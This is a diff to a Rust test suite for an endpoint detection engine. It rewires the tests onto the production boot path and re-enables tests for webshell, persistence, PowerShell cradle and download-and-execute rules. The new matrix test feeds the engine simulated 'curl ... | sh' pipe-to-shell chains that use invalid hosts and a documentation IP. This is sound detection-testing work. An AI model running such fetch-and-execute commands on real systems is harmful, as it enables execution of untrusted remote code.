@@ -1,25 +1,43 @@
-//! Do not remove these attack controls when deleting duplicate authored YAMLs.
-//! Run with --ignored after integrating ACORE's builtin rewrites.
 use detection::{
     compile_sigma_rule, Confidence, DetectionEngine, EventClass, TelemetryEvent, TemporalEngine,
 };
-const BOOTSTRAP: &str = include_str!("../../agent-core/src/lifecycle/detection_bootstrap.rs");
-fn target(name: &str) -> (TemporalEngine, String) {
-    let marker = format!("const {name}: &str = r#\"");
-    let yaml = BOOTSTRAP
-        .split_once(&marker)
-        .unwrap_or_else(|| panic!("RAFIX-INTEGRATION-ADAPT: bootstrap const {name} not found (removed by ACORE); rebuild target-only engine from combined boot path"))
-        .1
-        .split_once("\"#;")
-        .unwrap()
-        .0;
-    // Test-only platform bypass, identical compiler/qualification otherwise.
-    let yaml = yaml.replace("  product: windows\n", "");
-    let rule = compile_sigma_rule(&yaml).unwrap();
-    let name = rule.name.clone();
-    let mut engine = TemporalEngine::new();
-    engine.add_rule(rule);
-    (engine, name)
+const BOOTSTRAP: &str = include_str!("detection_bootstrap.rs");
+fn boot_engine(include_pack: bool) -> DetectionEngine {
+    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../..");
+    let tmp = std::env::temp_dir().join(format!("rafix-absent-{}", std::process::id()));
+    let sources = super::DetectionSourcePaths {
+        sigma_dir: if include_pack {
+            root.join("rules/sigma")
+        } else {
+            tmp.join("sigma")
+        },
+        yara_dir: tmp.join("yara"),
+        ioc_dir: tmp.join("ioc"),
+        control_plane_peers: vec![],
+    };
+    let mut engine = super::build_detection_engine_with_ransomware_policy(
+        detection::RansomwarePolicy::default(),
+        &sources,
+    );
+    // Synthetic Windows semantic proof: ONLY the native product filter differs.
+    // Native filtering itself is covered separately; Windows CI runs it natively.
+    if !cfg!(target_os = "windows") {
+        for part in BOOTSTRAP.split("const SIGMA_").skip(1) {
+            let yaml = part
+                .split_once("r#\"")
+                .unwrap()
+                .1
+                .split_once("\"#;")
+                .unwrap()
+                .0;
+            if yaml.contains("  product: windows") {
+                engine
+                    .load_sigma_rule_yaml(&yaml.replace("  product: windows\n", ""))
+                    .unwrap();
+            }
+        }
+    }
+    engine
 }
 fn ev(class: EventClass, process: &str, parent: &str, command: &str) -> TelemetryEvent {
     serde_json::from_value(serde_json::json!({"ts_unix":1,"event_class":class,"pid":900,"ppid":1,"uid":1000,
@@ -27,11 +45,32 @@ fn ev(class: EventClass, process: &str, parent: &str, command: &str) -> Telemetr
         "command_line":command,"container_escape":false,"container_privileged":false})).unwrap()
 }
 fn fires(name: &str, sequence: &[TelemetryEvent]) -> bool {
-    let (mut engine, rule) = target(name);
+    let mut engine = boot_engine(false);
     sequence.iter().enumerate().any(|(i, e)| {
         let mut e = e.clone();
         e.ts_unix += i as i64;
-        engine.observe(&e).contains(&rule)
+        let out = engine.process_event(&e);
+        match name {
+            "SIGMA_DOWNLOAD_EXEC" => {
+                out.temporal_hits
+                    .iter()
+                    .any(|n| n == "phi_download_pipe_shell")
+                    || out
+                        .exploit_indicators
+                        .iter()
+                        .any(|n| n.starts_with("fileless_pipe_exec"))
+            }
+            "SIGMA_WEBSHELL" => out.temporal_hits.iter().any(|n| n == "phi_webshell"),
+            "SIGMA_PERSISTENCE" => out
+                .temporal_hits
+                .iter()
+                .any(|n| n == "phi_persistence_write"),
+            "SIGMA_WIN_PS_DOWNLOAD_CRADLE" => out
+                .temporal_hits
+                .iter()
+                .any(|n| n == "eguard_win_ps_download_cradle"),
+            _ => panic!("unknown target {name}"),
+        }
     })
 }
 fn webshell_cases(fires: fn(&str, &[TelemetryEvent]) -> bool) {
@@ -181,7 +220,6 @@ fn pack_webshell_recall_and_precision() {
 }
 
 #[test]
-#[ignore = "RAFIX-INTEGRATION-ADAPT: rebuild target-only engine from combined boot path"]
 fn merged_webshell_keeps_attack_and_excludes_local_or_no_connect_hooks() {
     webshell_cases(fires);
 }
@@ -192,7 +230,6 @@ fn pack_download_recall_and_precision() {
 }
 
 #[test]
-#[ignore = "RAFIX-INTEGRATION-ADAPT: rebuild target-only engine from combined boot path"]
 fn merged_download_exec_keeps_pipe_attack_not_unrelated_shell() {
     download_cases(fires);
     unrelated_download_case(fires);
@@ -204,7 +241,6 @@ fn pack_persistence_recall_and_precision() {
 }
 
 #[test]
-#[ignore = "RAFIX-INTEGRATION-ADAPT: rebuild target-only engine from combined boot path"]
 fn merged_persistence_keeps_cron_write_not_package_or_service_administration() {
     persistence_cases(fires);
 }
@@ -215,13 +251,11 @@ fn pack_powershell_recall_and_precision() {
 }
 
 #[test]
-#[ignore = "RAFIX-INTEGRATION-ADAPT: rebuild target-only engine from combined boot path"]
 fn merged_powershell_keeps_both_execution_forms_not_download_only() {
     powershell_cases(fires);
 }
 
 #[test]
-#[ignore = "RAFIX-INTEGRATION-BLOCKER: base builtins phi_download_exec + eguard_builtin_download_exec fire on cron curl -> unrelated bash; owner ACORE"]
 fn pack_download_unrelated_shell_is_quiet() {
     unrelated_download_case(pack_fires);
 }
@@ -233,8 +267,10 @@ fn retained_download_declares_medium_and_matches_rustup() {
     let source = std::fs::read_to_string(root)
         .unwrap()
         .replace("  product: linux\n", "");
-    let doc: serde_yaml::Value = serde_yaml::from_str(&source).unwrap();
-    assert_eq!(doc["level"].as_str(), Some("medium"));
+    assert_eq!(
+        compile_sigma_rule(&source).unwrap().level,
+        detection::RuleLevel::Medium
+    );
     let mut engine = TemporalEngine::new();
     engine.add_rule(compile_sigma_rule(&source).unwrap());
     let hits = engine.observe(&ev(
@@ -246,67 +282,11 @@ fn retained_download_declares_medium_and_matches_rustup() {
     assert_eq!(hits, vec!["linux_download_exec"]);
 }
 
-// This mirrors the current source boot inputs and deliberately needs rebuilding
-// against ACORE's combined production boot path at integration.
 fn full_pack_engine_for_integration() -> DetectionEngine {
-    let mut engine = DetectionEngine::default_with_rules();
-    for (marker, features) in [
-        ("load_string_signatures([", false),
-        ("load_string_features([", true),
-    ] {
-        let body = BOOTSTRAP
-            .split_once(marker)
-            .unwrap_or_else(|| panic!("RAFIX-INTEGRATION-ADAPT: {marker} boot inputs changed"))
-            .1
-            .split_once("]);")
-            .unwrap()
-            .0;
-        let values: Vec<String> = body
-            .lines()
-            .filter_map(|line| line.trim().strip_prefix('"'))
-            .filter_map(|line| {
-                line.split_once(r#"".to_string()"#)
-                    .map(|(value, _)| value.replace(r"\\", r"\"))
-            })
-            .collect();
-        if features {
-            engine.layer1.load_string_features(values);
-        } else {
-            engine.layer1.load_string_signatures(values);
-        }
-    }
-    for line in BOOTSTRAP
-        .lines()
-        .map(str::trim)
-        .filter(|line| line.starts_with("const SIGMA_"))
-    {
-        let name = line
-            .split_whitespace()
-            .nth(1)
-            .unwrap()
-            .trim_end_matches(':');
-        let marker = format!("const {name}: &str = r#\"");
-        let source = BOOTSTRAP
-            .split_once(&marker)
-            .unwrap()
-            .1
-            .split_once("\"#;")
-            .unwrap()
-            .0;
-        let _ = engine.load_sigma_rule_yaml(source);
-    }
-    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/sigma");
-    for entry in std::fs::read_dir(root).unwrap() {
-        let path = entry.unwrap().path();
-        if path.extension().and_then(|s| s.to_str()) == Some("yml") {
-            let _ = engine.load_sigma_rule_yaml(&std::fs::read_to_string(path).unwrap());
-        }
-    }
-    engine
+    boot_engine(true)
 }
 
 #[test]
-#[ignore = "RAFIX-INTEGRATION-ADAPT: combined max severity for rustup installer chain must be <= MEDIUM; rebuild combined boot path"]
 fn rustup_installer_chain_has_one_alert_at_most_medium() {
     // Must-fire positive control in the SAME full-engine harness.
     let mut attack = full_pack_engine_for_integration();
@@ -352,4 +332,111 @@ fn rustup_installer_chain_has_one_alert_at_most_medium() {
         alerts[0].0 <= Confidence::Medium,
         "ordinary installer exceeded MEDIUM: {alerts:?}"
     );
+}
+
+#[test]
+fn production_pipeline_matrix_uses_runtime_shard_resolver() {
+    let _guard = crate::lifecycle::shared_env_var_lock().lock().unwrap();
+    let previous = std::env::var_os("EGUARD_DETECTION_SHARDS");
+    std::env::remove_var("EGUARD_DETECTION_SHARDS");
+    let shards = crate::lifecycle::resolve_detection_shard_count();
+    let mut failures = Vec::new();
+    for include_pack in [false, true] {
+        for wrapped in [false, true] {
+            for (download, parent, expected) in [
+                (
+                    "curl https://download.invalid/x",
+                    "bash",
+                    Confidence::Medium,
+                ),
+                ("curl http://download.invalid/x", "bash", Confidence::High),
+                ("curl https://198.51.100.9/x", "bash", Confidence::High),
+                ("curl https://download.invalid/x", "nginx", Confidence::High),
+                (
+                    "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs",
+                    "bash",
+                    Confidence::Medium,
+                ),
+            ] {
+                let state = crate::detection_state::SharedDetectionState::new_with_shards(
+                    boot_engine(include_pack),
+                    None,
+                    shards,
+                    || boot_engine(include_pack),
+                );
+                let mut p = ev(
+                    EventClass::ProcessExec,
+                    if wrapped { "sh" } else { parent },
+                    if wrapped { parent } else { "sshd" },
+                    if wrapped { "" } else { parent },
+                );
+                p.pid = 901;
+                p.ppid = 900;
+                p.session_id = 900;
+                if wrapped {
+                    p.command_line = Some(format!("sh -c \"{download} | sh\""));
+                }
+                let mut curl = ev(
+                    EventClass::ProcessExec,
+                    "curl",
+                    if wrapped { "sh" } else { parent },
+                    download,
+                );
+                curl.pid = 902;
+                curl.ppid = 901;
+                curl.session_id = 901;
+                curl.ts_unix = 2;
+                let mut shell = ev(
+                    EventClass::ProcessExec,
+                    "sh",
+                    if wrapped { "sh" } else { parent },
+                    "sh",
+                );
+                shell.pid = 903;
+                shell.ppid = 901;
+                shell.session_id = 901;
+                shell.ts_unix = 3;
+                let outcomes: Vec<_> = [p, curl, shell]
+                    .iter()
+                    .map(|e| state.process_event(e).unwrap())
+                    .collect();
+                let suppressed = outcomes.iter().filter(|o| o.pipe_alert_suppressed).count();
+                let alerts: Vec<_> = outcomes
+                    .iter()
+                    .filter(|o| o.confidence > Confidence::None)
+                    .collect();
+                if alerts.len() != 1
+                    || alerts[0].confidence != expected
+                    || suppressed != usize::from(wrapped)
+                {
+                    failures.push(format!("pack={include_pack} wrapped={wrapped} parent={parent} {download} expected={expected:?} suppressed={suppressed} outcomes={outcomes:?}"));
+                }
+                if wrapped {
+                    let state = crate::detection_state::SharedDetectionState::new_with_shards(
+                        boot_engine(include_pack),
+                        None,
+                        shards,
+                        || boot_engine(include_pack),
+                    );
+                    let mut only = ev(
+                        EventClass::ProcessExec,
+                        "sh",
+                        parent,
+                        &format!("sh -c \"{download} | sh\""),
+                    );
+                    only.pid = 901;
+                    only.ppid = 900;
+                    only.session_id = 900;
+                    let o = state.process_event(&only).unwrap();
+                    if o.confidence != expected || o.pipe_alert_suppressed {
+                        failures.push(format!("wrapper-only {download}: {o:?}"));
+                    }
+                }
+            }
+        }
+    }
+    if let Some(previous) = previous {
+        std::env::set_var("EGUARD_DETECTION_SHARDS", previous);
+    }
+    assert!(failures.is_empty(), "{}", failures.join("\n"));
 }
